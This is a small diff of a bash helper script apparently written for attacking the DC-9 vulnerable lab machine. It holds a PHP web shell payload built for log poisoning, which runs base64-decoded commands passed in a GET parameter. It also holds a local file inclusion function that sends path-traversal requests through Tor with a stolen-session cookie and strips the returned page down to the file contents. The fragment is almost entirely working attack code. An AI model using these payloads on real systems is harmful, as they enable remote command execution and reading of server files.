@@ -17,7 +17,7 @@ DC9_POISON_CODE='<?php echo('"'"'<pre>'"'"');system(base64_decode($_GET['"'"$DC9
 alias dc9-config="vim \"$(readlink -f ${BASH_SOURCE[0]})\" && echo -n \"Sourcing file...\" && source \"$(readlink -f ${BASH_SOURCE[0]})\" && echo \"Done\""
 
 function dc9-lfi(){
-  curltor -s -b "$DC9_COOKIE" http://$DC9/manage.php?file=../../../../..$@ \
+  curltor -i -s -b "$DC9_COOKIE" http://$DC9/welcome.php?file=../../../../..$@ \
       | awk 'NR==1{print $0} /<\/div>/{i=0} /File does not exist<br \/>/{i=1}i' | sed 's/.*<br \/>//g'
 
 }
